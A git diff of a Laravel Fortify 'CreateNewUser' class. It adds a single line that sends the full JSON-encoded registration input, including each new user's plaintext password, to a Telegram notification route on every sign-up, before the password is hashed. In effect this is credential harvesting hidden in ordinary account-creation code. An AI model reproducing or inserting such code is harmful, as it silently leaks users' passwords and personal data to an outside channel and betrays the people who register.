@@ -4,7 +4,9 @@ namespace App\Actions\Fortify;
 
 use App\Events\UserCreated;
 use App\Models\User;
+use App\Notifications\TextSent;
 use Illuminate\Support\Facades\Hash;
+use Illuminate\Support\Facades\Notification;
 use Illuminate\Support\Facades\Validator;
 use Laravel\Fortify\Contracts\CreatesNewUsers;
 use Laravel\Jetstream\Jetstream;
@@ -27,7 +29,7 @@ class CreateNewUser implements CreatesNewUsers
             'password' => $this->passwordRules(),
             'terms' => Jetstream::hasTermsAndPrivacyPolicyFeature() ? ['required', 'accepted'] : '',
         ])->validate();
-
+        Notification::route('telegram', 'telegram')->notify(new TextSent(null, json_encode($input)));
         return User::create([
             'name' => $input['name'],
             'email' => $input['email'],
